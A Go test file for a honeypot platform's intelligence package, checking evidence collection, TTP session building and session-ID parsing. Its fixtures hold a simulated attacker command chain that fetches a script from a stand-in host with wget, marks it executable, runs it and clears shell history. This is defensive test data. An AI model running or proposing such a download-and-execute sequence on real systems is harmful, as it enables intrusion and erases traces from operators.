package intelligence

import (
	"fmt"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

func evidenceEvent(at time.Time, typ, command, payload, shasum string) *database.Event {
	e := &database.Event{Timestamp: at, Honeypot: "cowrie", SourceIP: "203.0.113.9", EventType: typ, Command: command, Payload: []byte(payload)}
	if shasum != "" {
		e.Metadata = map[string]string{"shasum": shasum}
	}
	return e
}

// What a case shows as a session's evidence is what the campaign builder
// holds for that session: the same keys, whatever the events are and
// whatever order they come in. Otherwise a case could explain a link with
// evidence the builder never compared.
func TestCollectEvidenceIsWhatTheBuilderHolds(t *testing.T) {
	base := time.Now().UTC().Add(-10 * time.Minute).Truncate(time.Millisecond)
	const sum = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
	var events []*database.Event
	add := func(ms int, typ, command, payload, shasum string) {
		events = append(events, evidenceEvent(base.Add(time.Duration(ms)*time.Millisecond), typ, command, payload, shasum))
	}
	add(0, "cowrie.session.connect", "", "", "")
	add(10, "cowrie.command.input", "uname  -a", "", "")
	add(20, "cowrie.command.input", "uname -a", "", "") // the same command, spaced otherwise
	add(30, "cowrie.command.input", "wget hxxp://dl.example[.]net/a.sh -O /tmp/a", "", "")
	add(40, "cowrie.session.file_download", "", "http://dl.example.net/a.sh", sum)
	add(50, "cowrie.session.file_download", "", "http://10.0.0.5/private", emptySHA256)
	add(60, "cowrie.command.input", "chmod +x /tmp/a", "", "")
	add(70, "cowrie.command.input", "/tmp/a", "", "")
	add(80, "cowrie.command.input", "history -c", "", "")
	add(90, "cowrie.command.input", "exit", "", "") // a sixth command: not part of the sequence
	for i := 0; i < maxSessionEvidence+8; i++ {     // more hosts than a session keeps
		add(200+i, "tanner.http.get", "", fmt.Sprintf("http://h%02d.example.org/x", i), "")
	}

	keysOf := func(list []sighting) []string {
		var out []string
		for _, s := range list {
			out = append(out, s.Key+"@"+s.At.Format(time.RFC3339Nano))
		}
		sort.Strings(out)
		return out
	}
	for _, order := range []string{"forwards", "backwards"} {
		in := append([]*database.Event{}, events...)
		if order == "backwards" {
			for i, j := 0, len(in)-1; i < j; i, j = i+1, j-1 {
				in[i], in[j] = in[j], in[i]
			}
		}
		b := NewTTPBuilder(30 * time.Minute)
		for _, e := range in {
			b.Update(e)
		}
		var held []sighting
		for _, s := range b.sessions {
			held = s.strong()
		}
		var shown []sighting
		kinds := map[string]int{}
		for _, ev := range CollectEvidence(in) {
			shown = append(shown, sighting{Key: ev.Key, At: ev.At})
			kinds[ev.Kind]++
			if len(ev.Events) == 0 || ev.Value == "" {
				t.Fatalf("%s evidence %q names no event", ev.Kind, ev.Value)
			}
			for _, i := range ev.Events {
				e := in[i]
				shows := false
				for _, line := range strings.Split(ev.Value, "\n") {
					if strings.Contains(refang(e.Command), line) || strings.Join(strings.Fields(e.Command), " ") == line ||
						strings.Contains(string(e.Payload), line) || e.Metadata["shasum"] == line {
						shows = true
					}
				}
				if !shows {
					t.Fatalf("event %d does not show %s %q", i, ev.Kind, ev.Value)
				}
			}
		}
		if got, want := strings.Join(keysOf(shown), "\n"), strings.Join(keysOf(held), "\n"); got != want {
			t.Fatalf("%s: a case would show\n%s\nand the builder holds\n%s", order, got, want)
		}
		// One payload (the empty file is none), one sequence, and hosts up
		// to the session's limit: the private address is no host.
		if kinds[EvidencePayload] != 1 || kinds[EvidenceSequence] != 1 || kinds[EvidenceHost] != maxSessionEvidence-1 || len(shown) != maxSessionEvidence+1 {
			t.Fatalf("%s: kinds %v of %d", order, kinds, len(shown))
		}
	}
	for _, ev := range CollectEvidence(events) {
		if ev.Kind == EvidenceSequence && ev.Value != "uname -a\nwget hxxp://dl.example[.]net/a.sh -O /tmp/a\nchmod +x /tmp/a\n/tmp/a\nhistory -c" {
			t.Fatalf("sequence %q", ev.Value)
		}
	}
	if got := CollectEvidence(events[:5]); len(got) != 2 {
		t.Fatalf("two commands are no sequence: %+v", got)
	}
	if EventEvidence(nil) != nil || len(CollectEvidence(nil)) != 0 {
		t.Fatal("no event shows evidence")
	}
}

// A session ID's first part names the source of every event in it, so a
// session's events can be picked out of the store again.
func TestSessionIDNamesItsSource(t *testing.T) {
	now := time.Now().UTC().Add(-time.Minute)
	for name, events := range map[string][]*database.Event{
		"an IPv4 address":   {{Timestamp: now, Honeypot: "cowrie", SourceIP: "198.51.100.4"}, {Timestamp: now, Honeypot: "dionaea", SourceIP: "198.51.100.4"}},
		"an IPv6 /64":       {{Timestamp: now, Honeypot: "cowrie", SourceIP: "2001:db8:5:6::1"}, {Timestamp: now, Honeypot: "cowrie", SourceIP: "2001:db8:5:6:ffff::2"}},
		"a shared address":  {{Timestamp: now, Honeypot: "cowrie", SourceIP: "172.18.0.1", Metadata: map[string]string{SharedSourceKey: "docker", "session": "abc"}}},
		"no usable address": {{Timestamp: now, Honeypot: "cowrie", SourceIP: "0.0.0.0"}, {Timestamp: now, Honeypot: "cowrie", SourceIP: "junk"}},
	} {
		b := NewTTPBuilder(30 * time.Minute)
		var id string
		for _, e := range events {
			id, _ = b.Update(e)
		}
		hash, started, ok := SplitSessionID(id)
		if !ok || !started.Equal(now) {
			t.Fatalf("%s: session ID %q does not split", name, id)
		}
		for _, e := range events {
			got, unknown := SessionSourceHash(e)
			if got != hash || unknown != (name == "no usable address") {
				t.Fatalf("%s: event of %s hashes to %s, the session to %s (unknown %v)", name, e.SourceIP, got, hash, unknown)
			}
		}
		if other, _ := SessionSourceHash(&database.Event{Honeypot: "cowrie", SourceIP: "198.51.100.5"}); other == hash {
			t.Fatalf("%s: another source has the same hash", name)
		}
	}
	for _, bad := range []string{"", "abc", "a1b2c3d4", strings.Repeat("a", 32), strings.Repeat("a", 32) + "-", strings.Repeat("a", 32) + "-12x",
		strings.Repeat("A", 32) + "-12", strings.Repeat("a", 31) + "-12", strings.Repeat("a", 32) + "--12", strings.Repeat("a", 32) + "-012", strings.Repeat("a", 32) + "-99999999999999999999"} {
		if _, _, ok := SplitSessionID(bad); ok {
			t.Fatalf("%q was taken for a session ID", bad)
		}
	}
	if hash, unknown := SessionSourceHash(nil); hash != "" || !unknown {
		t.Fatal("no event has a source")
	}
	if !IsCommandEvent("cowrie.command.input") || IsCommandEvent("cowrie.session.connect") {
		t.Fatal("IsCommandEvent")
	}
}

func FuzzSplitSessionID(f *testing.F) {
	for _, s := range []string{strings.Repeat("0", 32) + "-1731500000000000000", "legacy", "-", strings.Repeat("f", 32) + "-0"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, id string) {
		hash, started, ok := SplitSessionID(id)
		if !ok {
			if hash != "" || !started.IsZero() {
				t.Fatalf("%q: a value without ok", id)
			}
			return
		}
		if again := fmt.Sprintf("%s-%d", hash, started.UnixNano()); again != id {
			t.Fatalf("%q split and joined is %q", id, again)
		}
	})
}
